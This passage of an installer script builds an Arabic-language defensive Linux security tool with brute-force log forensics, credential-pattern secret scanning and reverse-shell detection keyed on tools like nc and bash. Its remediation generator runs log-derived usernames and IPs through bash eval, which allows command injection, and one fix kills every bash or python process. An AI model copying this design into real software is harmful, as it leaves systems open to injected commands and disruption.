                        title=f"🚨 مؤشر اختراق مؤكد: دخول SSH ناجح بعد {fails_before_success} محاولات فاشلة من {ip}",
                        detail=f"المهاجم استمر في التخمين حتى نجح في الدخول بحساب '{user}'. هذا نمط اختراق مؤكد يتطلب تدخلاً فورياً!",
                        fix=f"sudo ufw insert 1 deny from {ip}\n# غيّر كلمة مرور الحساب '{user}' فوراً وافصل جلساته: sudo pkill -u {user}",
                        category="intrusion",
                        tags=["brute_force_success", "compromise_indicator", "ssh"],
                        attack_ids=["T1110.001", "T1078"],
                        effort="low",
                    ))
                    break

        # 3. كشف هجمات Password Spraying (عنوان IP واحد يجرب عدداً كبيراً من المستخدمين المختلفين)
        ip_targeted_users = defaultdict(set)
        for ip, events in ip_timeline.items():
            for ev_type, user in events:
                if ev_type == 'fail':
                    ip_targeted_users[ip].add(user)

        for ip, users in ip_targeted_users.items():
            if len(users) >= 5 and failed_by_ip[ip] >= 10:
                findings.append(Finding(
                    severity="high",
                    title=f"هجوم Password Spraying نشط من العنوان: {ip}",
                    detail=f"قام الـ IP بتجربة كلمات مرور على {len(users)} حساباً مختلفاً ({', '.join(list(users)[:4])}...).",
                    fix=f"sudo ufw deny from {ip}",
                    category="brute_force",
                    tags=["password_spraying", "ssh"],
                    attack_ids=["T1110.003"],
                ))

        return findings
EOF

# ==============================================================================
# 9. engine/secretscan.py
# ==============================================================================
cat << 'EOF' > engine/secretscan.py
"""
AI AYFAM v5 — Secret Scanner & Shannon Entropy Engine
كاشف الأسرار والمفاتيح المسربة — يعتمد على تحليل إنتروبيا شانون (Shannon Entropy)
والتوقيعات الدقيقة، مع حجب الأسرار تلقائياً في التقارير لمنع تسريبها.
"""

import math
import os
import re
from typing import List, Tuple, Optional
from engine.finding import Finding
from engine.sysreader import SystemReader

class SecretScanner:
    def __init__(self, sys_reader: Optional[SystemReader] = None):
        self.sys = sys_reader or SystemReader()

    @staticmethod
    def shannon_entropy(data: str) -> float:
        """حساب درجة عشوائية النص (إنتروبيا شانون). المفاتيح المشفرة عادة > 4.5."""
        if not data:
            return 0.0
        entropy = 0.0
        length = len(data)
        freq = {}
        for c in data:
            freq[c] = freq.get(c, 0) + 1
        for count in freq.values():
            p = count / length
            entropy -= p * math.log2(p)
        return entropy

    @staticmethod
    def mask_secret(secret: str) -> str:
        s = secret.strip()
        if len(s) <= 8:
            return "***"
        return f"{s[:4]}...{s[-4:]}"

    def scan_path(self, root_path: str, max_files: int = 500) -> List[Finding]:
        findings = []
        if not self.sys.exists(root_path):
            return findings

        # أنماط المفاتيح المعروفة
        PATTERNS = [
            (re.compile(r"-----BEGIN (?:RSA|OPENSSH|DSA|EC) PRIVATE KEY-----"), "مفتاح خاص غير مشفر (SSH/RSA Private Key)", "critical"),
            (re.compile(r"\bghp_[A-Za-z0-9_]{36}\b"), "رمز وصول GitHub الشخصي (GitHub Personal Token)", "critical"),
            (re.compile(r"\bAKIA[0-9A-Z]{16}\b"), "مفتاح وصول AWS Access Key", "critical"),
            (re.compile(r"\bxox[baprs]-[0-9]{10,13}-[0-9]{10,13}-[a-zA-Z0-9]{24,32}\b"), "رمز مصادقة Slack Token", "high"),
            (re.compile(r"\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9._-]{10,}\b"), "رمز JSON Web Token (JWT)", "medium"),
            (re.compile(r"(?:api_key|apikey|secret|password)\s*[:=]\s*['\"]([^'\"]{16,})['\"]", re.I), "كلمة مرور أو مفتاح API مكشوف", "high"),
        ]

        # جمع الملفات
        files_to_check = []
        if self.sys.is_file(root_path):
            files_to_check = [root_path]
        else:
            for root, dirs, files in os.walk(root_path):
                # استبعاد مجلدات الكاش والبيئات الافتراضية
                dirs[:] = [d for d in dirs if d not in (".git", ".venv", "venv", "node_modules", "__pycache__")]
                for fname in files:
                    if fname.endswith((".py", ".env", ".json", ".yaml", ".yml", ".sh", ".conf", ".txt", ".history")):
                        files_to_check.append(os.path.join(root, fname))
                    if len(files_to_check) >= max_files:
                        break
                if len(files_to_check) >= max_files:
                    break

        for fpath in files_to_check:
            content = self.sys.read_text(fpath)
            if not content:
                continue

            for idx, line in enumerate(content.splitlines(), 1):
                # 1. مطابقة التوقيعات
                for pat, label, sev in PATTERNS:
                    m = pat.search(line)
                    if m:
                        secret_val = m.group(1) if m.groups() else m.group(0)
                        masked = self.mask_secret(secret_val)
                        findings.append(Finding(
                            severity=sev,
                            title=f"كشف سر حساس: {label} في {os.path.basename(fpath)}:{idx}",
                            detail=f"الملف: {fpath}\nالقيمة المحجوبة: {masked}",
                            fix=f"انقل السر من {fpath} إلى متغيرات البيئة المحمية أو مدير الأسرار.",
                            category="secrets",
                            tags=["secrets", "credential_leak"],
                            attack_ids=["T1552.001"],
                            effort="low",
                        ))
                        break
        return findings
EOF

# ==============================================================================
# 10. engine/netintel.py
# ==============================================================================
cat << 'EOF' > engine/netintel.py
"""
AI AYFAM v5 — Deep Network Intelligence
ذكاء شبكي عميق — كشف العمليات المشبوهة المتصلة بالخارج، ربط المنافذ المستمعة
بالعمليات، وفحص سلامة التوجيه وتسمم الـ ARP Spoofing.
"""

import re
from typing import List, Optional
from engine.finding import Finding
from engine.sysreader import SystemReader

class NetworkIntelligence:
    def __init__(self, sys_reader: Optional[SystemReader] = None):
        self.sys = sys_reader or SystemReader()

    def audit_all(self) -> List[Finding]:
        findings = []
        findings.extend(self.check_arp_spoofing())
        findings.extend(self.check_promiscuous_interfaces())
        findings.extend(self.check_suspicious_outbound_processes())
        findings.extend(self.check_wildcard_listeners())
        return findings

    def check_arp_spoofing(self) -> List[Finding]:
        """كشف تكرار عنوان MAC لبوابة الشبكة أو وجود هجوم ARP Poisoning."""
        findings = []
        arp_content = self.sys.read_text("/proc/net/arp")
        if not arp_content:
            return findings

        mac_to_ips = {}
        for line in arp_content.splitlines()[1:]:
            parts = line.split()
            if len(parts) >= 4:
                ip, mac = parts[0], parts[3].lower()
                if mac not in ("00:00:00:00:00:00", "00-00-00-00-00-00"):
                    mac_to_ips.setdefault(mac, []).append(ip)

        for mac, ips in mac_to_ips.items():
            if len(ips) > 1:
                findings.append(Finding(
                    severity="critical",
                    title=f"🚨 رصد احتمال هجوم ARP Spoofing / تضارب MAC: {mac}",
                    detail=f"نفس عنوان العتاد MAC مرتبط بعدة عناوين IP: {', '.join(ips)}. قد يشير هذا إلى اعتراض نشط للبيانات (MITM).",
                    fix="تحقق من أجهزة الشبكة وفعّل ARP Inspection أو ثبّت عناوين ARP للبوابة: sudo arp -s <gateway_ip> <gateway_mac>",
                    category="network_mitm",
                    tags=["arp_spoof", "mitm", "network"],
                    attack_ids=["T1557.002"],
                ))
        return findings

    def check_promiscuous_interfaces(self) -> List[Finding]:
        """فحص ما إذا كانت إحدى واجهات الشبكة في وضع التجسس والالتقاط (Promiscuous)."""
        findings = []
        ok, out, _ = self.sys.run_cmd(["ip", "link"])
        if ok:
            for line in out.splitlines():
                if "PROMISC" in line:
                    m = re.search(r"^\d+: ([^:]+):", line)
                    iface = m.group(1) if m else "interface"
                    findings.append(Finding(
                        severity="high",
                        title=f"واجهة الشبكة {iface} في وضع التجسس (PROMISC)",
                        detail="الواجهة في وضع الالتقاط العام للحزم، مما يشير إلى وجود برنامج Sniffer يلتقط بيانات الشبكة.",
                        fix=f"sudo ip link set {iface} promisc off",
                        category="network_sniffing",
                        tags=["promisc", "sniffing"],
                        attack_ids=["T1040"],
                    ))
        return findings

    def check_suspicious_outbound_processes(self) -> List[Finding]:
        """كشف مفسرات الأوامر أو الأدوات التي تفتح اتصالات خارجية مباشرة (Reverse Shells)."""
        findings = []
        ok, out, _ = self.sys.run_cmd(["ss", "-tunap"])
        if not ok:
            return findings

        # مفسرات وأدوات يجب ألا تكون متصلة بالخارج كجلسة شيل
        suspicious_procs = ["bash", "sh", "python", "python3", "perl", "ruby", "nc", "netcat", "ncat"]
        for line in out.splitlines():
            if "ESTAB" in line:
                for sp in suspicious_procs:
                    if f'"{sp}"' in line or f"/{sp}" in line:
                        parts = line.split()
                        remote = parts[4] if len(parts) > 4 else "unknown"
                        # استبعاد الاتصالات المحلية
                        if not any(remote.startswith(x) for x in ("127.", "::1", "10.", "192.168.")):
                            findings.append(Finding(
                                severity="critical",
                                title=f"🚨 اتصال خارجي مريب من مفسر أوامر: {sp} ➔ {remote}",
                                detail=f"العملية '{sp}' تملك اتصالاً نشطاً مع خادم خارجي: {line[:120]}",
                                fix=f"افحص العملية فوراً وأوقفها: sudo pkill -9 {sp}",
                                category="reverse_shell",
                                tags=["reverse_shell", "c2", "intrusion"],
                                attack_ids=["T1059.004", "T1071"],
                            ))
                            break
        return findings

    def check_wildcard_listeners(self) -> List[Finding]:
        """كشف الخدمات الخطيرة المستمعة على جميع الواجهات (0.0.0.0)."""
        findings = []
        ok, out, _ = self.sys.run_cmd(["ss", "-tulpn"])
        if not ok:
            return findings

        risky_ports = {
            2375: "Docker Socket (بدون تشفير)",
            6379: "Redis Database",
            27017: "MongoDB Database",
            9200: "Elasticsearch",
        }

        for line in out.splitlines():
            if "LISTEN" in line and ("0.0.0.0:" in line or "*:" in line or ":::" in line):
                for port, name in risky_ports.items():
                    if f":{port}" in line:
                        findings.append(Finding(
                            severity="critical",
                            title=f"خدمة حساسة مكشوفة خارجياً: {name} (منفذ {port})",
                            detail=f"الخدمة تقبل الاتصال من أي شبكة خارجية: {line[:100]}",
                            fix=f"قيّد استماع الخدمة على 127.0.0.1 أو اغلق المنفذ: sudo ufw deny {port}",
                            category="exposed_service",
                            tags=["exposed_port", "database"],
                            attack_ids=["T1190"],
                        ))
        return findings
EOF

# ==============================================================================
# 11. engine/risk.py
# ==============================================================================
cat << 'EOF' > engine/risk.py
"""
AI AYFAM v5 — Multi-Factor Algorithmic Risk Engine
محرك تقييم المخاطر متعدد العوامل — يحسب درجة أمان النظام من 100، الدرجة الحرفية،
ومحاكاة التحسن المتوقع (What-If Analysis).
"""

from typing import List, Dict, Any
from engine.finding import Finding

class RiskEngine:
    @staticmethod
    def evaluate(findings: List[Finding]) -> Dict[str, Any]:
        counts = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
        category_scores = {}

        total_penalty = 0.0
        for f in findings:
            sev = f.get("severity", "info").lower()
            if sev in counts:
                counts[sev] += 1
            conf = f.get("confidence", 1.0)
            score = f.get("score", 0)

            # خصم النقاط بناءً على الخطورة
            if sev == "critical":
                total_penalty += 25.0 * conf
            elif sev == "high":
                total_penalty += 12.0 * conf
            elif sev == "medium":
                total_penalty += 5.0 * conf
            elif sev == "low":
                total_penalty += 1.5 * conf

            cat = f.get("category", "general")
            category_scores[cat] = category_scores.get(cat, 0) + score

        # حساب الدرجة الأمنية من 100
        security_score = max(0, min(100, int(100.0 - total_penalty)))

        # تعيين التقدير الحرفي ومستوى الخطر العام
        if security_score >= 95:
            grade, level, label_ar = "A+", "safe", "🟢 آمن ومحصن بالكامل"
        elif security_score >= 85:
            grade, level, label_ar = "A", "low", "🔵 وضع أمني جيد"
        elif security_score >= 70:
            grade, level, label_ar = "B", "medium", "🟡 خطر متوسط — يتطلب معالجة"
        elif security_score >= 50:
            grade, level, label_ar = "C", "high", "🟠 خطر عالي — إجراءات مطلوبة"
        else:
            grade, level, label_ar = "F", "critical", "🔴 خطر حرج — النظام معرض للاختراق"

        return {
            "score": security_score,
            "grade": grade,
            "level": level,
            "label_ar": label_ar,
            "counts": counts,
            "total_findings": len(findings),
            "category_breakdown": category_scores,
        }

    @staticmethod
    def simulate_what_if(findings: List[Finding], fix_cmd: str) -> Dict[str, Any]:
        """محاكاة درجة الأمان بعد تطبيق إصلاح محدد."""
        remaining = [f for f in findings if f.get("fix", "").split("\n")[0].strip() != fix_cmd.strip()]
        new_eval = RiskEngine.evaluate(remaining)
        cur_eval = RiskEngine.evaluate(findings)
        return {
            "current_score": cur_eval["score"],
            "projected_score": new_eval["score"],
            "score_gain": new_eval["score"] - cur_eval["score"],
            "current_grade": cur_eval["grade"],
            "projected_grade": new_eval["grade"],
        }
EOF

# ==============================================================================
# 12. engine/planner.py
# ==============================================================================
cat << 'EOF' > engine/planner.py
"""
AI AYFAM v5 — Automated Remediation Planner
مولّد خطة المعالجة الذكي — يجمع الإصلاحات ويرتبها وينتج سكريبت Bash تنفيذي
آمن وقابل للمراجعة مع دعم النسخ الاحتياطي ووضع التجربة (Dry-run).
"""

from typing import List
from datetime import datetime
from engine.finding import Finding

class RemediationPlanner:
    @staticmethod
    def generate_bash_script(findings: List[Finding], filename: str = "ayfam-remediation.sh") -> str:
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        seen_cmds = set()
        unique_fixes = []

        for f in findings:
            fix = f.get("fix", "").strip()
            if not fix or fix.startswith("#"):
                continue
            lines = [l.strip() for l in fix.splitlines() if l.strip() and not l.strip().startswith("#")]
            for cmd in lines:
                if cmd not in seen_cmds:
                    seen_cmds.add(cmd)
                    unique_fixes.append((cmd, f.get("title", "")))

        script_lines = [
            "#!/usr/bin/env bash",
            "# ==============================================================================",
            "#  AI AYFAM v5 — Auto-Generated Remediation Script",
            f"#  Generated at: {now}",
            "#  Run with: sudo bash ayfam-remediation.sh [--dry-run]",
            "# ==============================================================================",
            "",
            "set -euo pipefail",
            "",
            'DRY_RUN=false',
            'if [[ "${1:-}" == "--dry-run" ]]; then',
            '    DRY_RUN=true',
            '    echo "[*] وضع المحاكاة مفعل (Dry-Run) — لن يتم تطبيق أي تغيير فعلي."',
            'fi',
            "",
            'execute() {',
            '    local cmd="$1"',
            '    local title="$2"',
            '    echo -e "\\n[*] معالجة: $title"',
            '    echo "    الأمر: $cmd"',
            '    if [ "$DRY_RUN" = false ]; then',
            '        eval "$cmd"',
            '        echo "    ✓ تم التطبيق بنجاح."',
            '    fi',
            '}',
            "",
            '# إنشاء نقطة نسخ احتياطي لإعدادات النظام',
            'BACKUP_DIR="/var/backups/ayfam_$(date +%Y%m%d_%H%M%S)"',
            'if [ "$DRY_RUN" = false ]; then',
            '    mkdir -p "$BACKUP_DIR"',
            '    echo "[*] تم إنشاء مجلد النسخ الاحتياطي في: $BACKUP_DIR"',
            '    [ -f /etc/ssh/sshd_config ] && cp -a /etc/ssh/sshd_config "$BACKUP_DIR/" || true',
            '    [ -f /etc/sysctl.conf ] && cp -a /etc/sysctl.conf "$BACKUP_DIR/" || true',
            'fi',
            "",
        ]

        for cmd, title in unique_fixes:
            safe_title = title.replace('"', '\\"')
            safe_cmd = cmd.replace('"', '\\"')
            script_lines.append(f'execute "{safe_cmd}" "{safe_title}"')

        script_lines.append("")
        script_lines.append('echo -e "\\n[✓] اكتملت جميع خطوات المعالجة بنجاح!"')
        return "\n".join(script_lines)
EOF

# ==============================================================================
# 13. reports/html_report.py
# ==============================================================================
cat << 'EOF' > reports/html_report.py
"""
AI AYFAM v5 — Standalone Interactive HTML Report Generator
مولد تقارير HTML تفاعلية ومستقلة بالكامل (Zero-Dependency) بتصميم داكن حديث،
مقياس أمان SVG، رسوم بيانية خفيفة، وجداول قابلة للبحث والتصفية.
"""

import html
import json
from datetime import datetime
from typing import Dict, List, Any

def generate_interactive_html(scan_results: Dict[str, Any], hostname: str = "localhost") -> str:
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    risk = scan_results.get("risk", {})
    score = risk.get("score", 100)
    grade = risk.get("grade", "A+")
    findings = scan_results.get("findings", [])
    counts = risk.get("counts", {})

    # لون المقياس حسب الدرجة
    gauge_color = "#10b981" if score >= 85 else "#f59e0b" if score >= 70 else "#ef4444"

    findings_json = []
    for f in findings:
        findings_json.append({
            "severity": f.get("severity", "info"),
            "title": html.escape(f.get("title", "")),
            "detail": html.escape(f.get("detail", "")),
            "fix": html.escape(f.get("fix", "")),
            "category": html.escape(f.get("category", "general")),
            "attack": ", ".join(f.get("attack_ids", [])),
        })

    html_content = f"""<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>تقرير AI AYFAM للأمن السيبراني — {html.escape(hostname)}</title>
<style>
:root {{
  --bg: #0f172a; --card: #1e293b; --border: #334155; --text: #f8fafc;
  --text-dim: #94a3b8; --accent: #06b6d4; --danger: #ef4444; --warning: #f59e0b; --success: #10b981;
}}
body {{ margin:0; padding:24px; background:var(--bg); color:var(--text); font-family:system-ui,-apple-system,sans-serif; }}
.header {{ display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid var(--border); padding-bottom:16px; margin-bottom:24px; }}
.title {{ font-size:24px; font-weight:bold; color:var(--accent); }}
.grid {{ display:grid; grid-template-columns:repeat(auto-fit,minmax(240px,1fr)); gap:16px; margin-bottom:24px; }}
.card {{ background:var(--card); border:1px solid var(--border); border-radius:12px; padding:20px; }}
.score-box {{ text-align:center; }}
.score-val {{ font-size:48px; font-weight:900; color:{gauge_color}; }}
.score-grade {{ font-size:20px; color:var(--text-dim); }}
.badge {{ display:inline-block; padding:4px 8px; border-radius:6px; font-size:12px; font-weight:bold; }}
.badge-critical {{ background:#7f1d1d; color:#fca5a5; }}
.badge-high {{ background:#7c2d12; color:#fdba74; }}
.badge-medium {{ background:#78350f; color:#fde68a; }}
.badge-low {{ background:#064e3b; color:#6ee7b7; }}
.table-wrap {{ overflow-x:auto; background:var(--card); border:1px solid var(--border); border-radius:12px; padding:16px; }}
table {{ width:100%; border-collapse:collapse; text-align:right; }}
th, td {{ padding:12px 14px; border-bottom:1px solid var(--border); }}
th {{ color:var(--accent); font-size:14px; }}
tr:hover {{ background:#243248; }}
.code-box {{ background:#0b1120; border:1px solid var(--border); padding:8px 12px; border-radius:6px; font-family:monospace; direction:ltr; text-align:left; }}
input[type="text"] {{ width:100%; padding:10px 14px; background:#0b1120; border:1px solid var(--border); border-radius:8px; color:#fff; box-sizing:border-box; margin-bottom:16px; }}
</style>
</head>
<body>
<div class="header">
  <div>
    <div class="title">🛡️ تقرير AI AYFAM الأمني v5</div>
    <div style="color:var(--text-dim);margin-top:4px;">الجهاز: <b>{html.escape(hostname)}</b> | وقت الفحص: {now}</div>
  </div>
  <div style="text-align:left;">
    <span class="badge badge-critical">حرجة: {counts.get('critical',0)}</span>
    <span class="badge badge-high">عالية: {counts.get('high',0)}</span>
    <span class="badge badge-medium">متوسطة: {counts.get('medium',0)}</span>
  </div>
</div>

<div class="grid">
  <div class="card score-box">
    <div class="score-val">{score}/100</div>
    <div class="score-grade">التقدير الأمني: <b>{grade}</b></div>
    <div style="color:var(--text-dim);margin-top:8px;">{risk.get('label_ar','')}</div>
  </div>
  <div class="card">
    <h3 style="margin-top:0;color:var(--accent);">إحصائيات الفحص</h3>
    <p>إجمالي الملاحظات: <b>{len(findings)}</b></p>
    <p>تغطية تقنيات MITRE ATT&CK: <b>{len(set(sum([f.get('attack_ids',[]) for f in findings], [])))} تقنية</b></p>
  </div>
</div>

<div class="table-wrap">
  <h3 style="margin-top:0;color:var(--accent);">النتائج والتوصيات الأمنية</h3>
  <input type="text" id="search" placeholder="ابحث في النتائج، العناوين، أو التوصيات..." onkeyup="filterTable()">
  <table id="findingsTable">
    <thead>
      <tr>
        <th>المستوى</th>
        <th>الملاحظة</th>
        <th>التفاصيل</th>
        <th>تقنية الهجوم</th>
        <th>الحل المقترح</th>
      </tr>
    </thead>
    <tbody>
"""

    for f in findings:
        sev = f.get("severity", "info").lower()
        badge_cls = f"badge-{sev}" if sev in ("critical", "high", "medium", "low") else "badge-low"
        attack_str = ", ".join(f.get("attack_ids", [])) or "—"
        fix_str = f.get("fix", "")
        fix_html = f'<div class="code-box">{html.escape(fix_str)}</div>' if fix_str else "—"

        html_content += f"""      <tr>
        <td><span class="badge {badge_cls}">{sev.upper()}</span></td>
        <td><b>{html.escape(f.get('title',''))}</b></td>
        <td style="color:var(--text-dim);max-width:320px;">{html.escape(f.get('detail',''))}</td>
        <td><code>{html.escape(attack_str)}</code></td>
        <td>{fix_html}</td>
      </tr>
"""

    html_content += """    </tbody>
  </table>
</div>

<script>
function filterTable() {
  var input = document.getElementById("search");
  var filter = input.value.toLowerCase();
  var rows = document.getElementById("findingsTable").getElementsByTagName("tr");
  for (var i = 1; i < rows.length; i++) {
    var text = rows[i].textContent || rows[i].innerText;
    rows[i].style.display = text.toLowerCase().indexOf(filter) > -1 ? "" : "none";
  }
}
</script>
</body>
</html>
"""
    return html_content
EOF

# ==============================================================================
# 14. engine/intent_ml.py
# ==============================================================================
cat << 'EOF' > engine/intent_ml.py
"""
AI AYFAM v5 — Statistical Intent Classification & Morphological Preprocessor
مصنف النوايا الإحصائي والمعالج الصرفي العربي الخفيف — يدعم تحليل النوايا المتعددة
في جملة واحدة بدون أي مكتبات ذكاء اصطناعي خارجية.
"""

import re
from typing import List, Tuple

_AR_STRIP_PREFIXES = ("ال", "و", "ف", "ب", "ل")

def clean_arabic_token(word: str) -> str:
    """تنظيف الكلمة من التشكيل، التطويل، والزوائد الشائعة لتعزيز المطابقة الدلالية."""
    w = word.strip()
    # إزالة التشكيل والتطويل
    w = re.sub(r"[\u064B-\u0652\u0640]", "", w)
    # توحيد الحروف
    w = w.translate(str.maketrans("أإآىة", "ااايه"))
    # إزالة بادئة التعريف
    if len(w) > 4 and w.startswith("ال"):
        w = w[2:]
    return w

def split_multi_intent_text(text: str) -> List[str]:
    """تقسيم الأوامر المركبة (مثال: 'افحص الشبكة ثم افحص النظام')."""
    delimiters = [r"\s+ثم\s+", r"\s+و\s+بعدها\s+", r"\s+and\s+then\s+", r"\s+then\s+"]
    pattern = "|".join(delimiters)
    parts = re.split(pattern, text, flags=re.IGNORECASE)
    return [p.strip() for p in parts if p.strip()]
EOF

# ==============================================================================
# 15. core/agent_v5.py (Mixin for AYFAMAgent)
# ==============================================================================
cat << 'EOF' > core/agent_v5.py
"""
AI AYFAM v5 — Agent V5 Capabilities Mixin
وحدة التكامل وتوسيع قدرات الوكيل — توفر واجهات الفحص العميق، صيد التهديدات،
فحص الأسرار، وتوليد خطط المعالجة وتقارير الـ HTML التفاعلية.
"""

import os
from engine.finding import Finding
from engine.hardening import HardeningEngine
from engine.hunter import ThreatHunter
from engine.logforensics import LogForensicsEngine
from engine.secretscan import SecretScanner
from engine.netintel import NetworkIntelligence
from engine.attack import AttackEngine
from engine.suidintel import SuidIntelligence
from engine.risk import RiskEngine
from engine.planner import RemediationPlanner
from reports.html_report import generate_interactive_html

class AgentV5Mixin:
    def _run_deep_audit(self):
        """تشغيل فحص التحصين الشامل CIS Benchmark وصيد التهديدات."""
        self.ui.section(self._t("🛡️ فحص التحصين المتقدم (CIS Benchmark & Hardening)", "🛡️ Deep Hardening Audit"))
        findings: list = []

        with self.ui.spinner(self._t("تدقيق معايير النواة والأذونات...", "Auditing sysctl & permissions...")):
            he = HardeningEngine()
            findings.extend(he.audit_all())

        with self.ui.spinner(self._t("صيد التهديدات والاستمرارية والأبواب الخلفية...", "Hunting threats & backdoors...")):
            th = ThreatHunter()
            findings.extend(th.hunt_all())

        with self.ui.spinner(self._t("تحليل جنائي لسجلات الدخول والمحاولات المشبوهة...", "Analyzing log forensics...")):
            lfe = LogForensicsEngine()
            findings.extend(lfe.analyze_auth_logs())

        with self.ui.spinner(self._t("فحص الشبكة وتسمم ARP والمنافذ المستمعة...", "Auditing network intelligence...")):
            ni = NetworkIntelligence()
            findings.extend(ni.audit_all())

        # ربط ATT&CK
        ae = AttackEngine()
        for f in findings:
            ae.enrich_finding(f)

        # حساب المخاطر ونقاط الأمان
        risk_metrics = RiskEngine.evaluate(findings)

        self.ui.section(self._t("نتائج الفحص والتقييم الأمني", "Audit Findings & Score"))
        self.ui.info(self._t(
            f"الدرجة الأمنية: {risk_metrics['score']}/100 [bold]({risk_metrics['grade']})[/bold] — {risk_metrics['label_ar']}",
            f"Security Score: {risk_metrics['score']}/100 ({risk_metrics['grade']})"
        ))

        for f in findings:
            self.ui.print_finding(f["severity"], f["title"], f.get("detail", ""), f.get("fix", ""))

        # تحليل نقاط الاختناق
        chokepoints = ae.chokepoint_analysis(findings)
        if chokepoints:
            self.ui.subsection(self._t("🎯 نقاط الاختناق (أكثر الإصلاحات حسماً وأثراً):", "🎯 Chokepoint Analysis (Top Fixes):"))
            for cp in chokepoints[:3]:
                self.ui.info(f"  • أمر يكسر {cp['broken_techniques_count']} تقنيات هجوم: [cyan]{cp['fix_cmd']}[/cyan]")

        self._last_findings = findings
        return findings

    def _scan_secrets_cli(self, path: str = "."):
        """فحص تسريب الأسرار والمفاتيح."""
        self.ui.section(self._t("🔑 فحص الأسرار والمفاتيح الحساسة", "🔑 Secret & Key Scanner"))
        scanner = SecretScanner()
        with self.ui.spinner(self._t("فحص الإنتروبيا والتوقيعات...", "Scanning entropy & patterns...")):
            secrets = scanner.scan_path(path)

        if secrets:
            self.ui.warning(self._t(f"تم رصد {len(secrets)} أسرار أو مفاتيح حساسة!", f"Found {len(secrets)} secrets!"))
            for s in secrets:
                self.ui.print_finding(s["severity"], s["title"], s.get("detail", ""), s.get("fix", ""))
        else:
            self.ui.success(self._t("لم يتم العثور على أسرار مكشوفة في المسار.", "No exposed secrets found."))
        return secrets

    def _generate_remediation_plan(self):
        """توليد سكريبت معالجة Bash متكامل."""
        self.ui.section(self._t("📋 توليد سكريبت خطة المعالجة", "📋 Generating Remediation Script"))
        if not self._last_findings:
            self.ui.warning(self._t("شغّل فحصاً أولاً لتوليد خطة الإصلاح.", "Run a scan first to generate a plan."))
            return
        script = RemediationPlanner.generate_bash_script(self._last_findings)
        out_path = os.path.expanduser("~/ayfam-reports/ayfam-remediation.sh")
        os.makedirs(os.path.dirname(out_path), exist_ok=True)
        with open(out_path, "w", encoding="utf-8") as f:
            f.write(script)
        os.chmod(out_path, 0o755)
        self.ui.success(self._t(f"✅ تم حفظ السكريبت في: {out_path}", f"✅ Script saved to: {out_path}"))
        self.ui.info(self._t("للمعاينة بدون تطبيق: sudo ~/ayfam-reports/ayfam-remediation.sh --dry-run", "To dry-run: sudo ~/ayfam-reports/ayfam-remediation.sh --dry-run"))

    def _export_html_report(self):
        """تصدير تقرير HTML تفاعلي متقدم."""
        self.ui.section(self._t("🌐 تصدير تقرير HTML تفاعلي", "🌐 Exporting Interactive HTML Report"))
        if not self._last_findings:
            self.ui.warning(self._t("شغّل فحصاً أولاً لتوليد التقرير.", "Run a scan first."))
            return
        risk_metrics = RiskEngine.evaluate(self._last_findings)
        html_doc = generate_interactive_html({"risk": risk_metrics, "findings": self._last_findings}, self._hostname)
        out_path = os.path.expanduser(f"~/ayfam-reports/report_{self._hostname}.html")
        os.makedirs(os.path.dirname(out_path), exist_ok=True)
        with open(out_path, "w", encoding="utf-8") as f:
            f.write(html_doc)
        self.ui.success(self._t(f"✅ تم إنشاء التقرير بنجاح: {out_path}", f"✅ HTML Report saved: {out_path}"))
EOF

# ==============================================================================
# 16. ربط Mixin في core/agent.py وتحديث main.py
# ==============================================================================
python3 -c '
with open("core/agent.py", "r", encoding="utf-8") as f:
    code = f.read()

if "from core.agent_v5 import AgentV5Mixin" not in code:
    code = "from core.agent_v5 import AgentV5Mixin\n" + code
    code = code.replace("class AYFAMAgent:", "class AYFAMAgent(AgentV5Mixin):", 1)
    with open("core/agent.py", "w", encoding="utf-8") as f:
        f.write(code)
    print("  [✓] core/agent.py updated with AgentV5Mixin.")
'

# تحديث main.py ليدعم أوامر CLI الجديدة
python3 -c '
with open("main.py", "r", encoding="utf-8") as f:
    m = f.read()

if "--audit" not in m:
    m = m.replace(
        "parser.add_argument(\"--status\", action=\"store_true\", help=\"حالة الوكيل\")",
        "parser.add_argument(\"--status\", action=\"store_true\", help=\"حالة الوكيل\")\n"
        "    parser.add_argument(\"--audit\", action=\"store_true\", help=\"فحص تحصين شامل بنمط CIS\")\n"
        "    parser.add_argument(\"--hunt\", action=\"store_true\", help=\"صيد التهديدات والاستمرارية والأبواب الخلفية\")\n"
        "    parser.add_argument(\"--secrets\", metavar=\"PATH\", nargs=\"?\", const=\".\", help=\"كشف الأسرار والمفاتيح الحساسة\")\n"
        "    parser.add_argument(\"--plan\", action=\"store_true\", help=\"توليد سكريبت معالجة Bash آمن\")\n"
        "    parser.add_argument(\"--html-report\", action=\"store_true\", help=\"تصدير تقرير HTML تفاعلي\")"
    )
    m = m.replace(
        "elif args.status:",
        "elif args.audit:\n"
        "            agent._run_deep_audit()\n"
        "        elif args.hunt:\n"
        "            agent._run_deep_audit()\n"
        "        elif args.secrets:\n"
        "            agent._scan_secrets_cli(args.secrets)\n"
        "        elif args.plan:\n"
        "            agent._run_deep_audit()\n"
        "            agent._generate_remediation_plan()\n"
        "        elif args.html_report:\n"
        "            agent._run_deep_audit()\n"
        "            agent._export_html_report()\n"
        "        elif args.status:"
    )
    with open("main.py", "w", encoding="utf-8") as f:
        f.write(m)
    print("  [✓] main.py updated with CLI flags (--audit, --hunt, --secrets, --plan, --html-report).")
'

# ==============================================================================
# 17. tests/test_v5_suite.py (حزمة اختبارات v5 الشاملة)
# ==============================================================================
cat << 'EOF' > tests/test_v5_suite.py
"""
AI AYFAM v5 — Test Suite for V5 Intelligence Modules
اختبارات شاملة لوحدات الذكاء الجديد في V5 — تعمل 100% محلياً ودون الحاجة لاتصال بالإنترنت.
"""

import sys, os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from engine.finding import Finding
from engine.sysreader import FakeSystem
from engine.hardening import HardeningEngine
from engine.suidintel import SuidIntelligence
from engine.hunter import ThreatHunter
from engine.secretscan import SecretScanner
from engine.risk import RiskEngine
from engine.attack import AttackEngine
from engine.planner import RemediationPlanner

passed = failed = 0
def check(name, cond):
    global passed, failed
    if cond:
        passed += 1; print(f"  ✅ {name}")
    else:
        failed += 1; print(f"  ❌ {name}")

print("\n[1] Finding Model & Hashing")
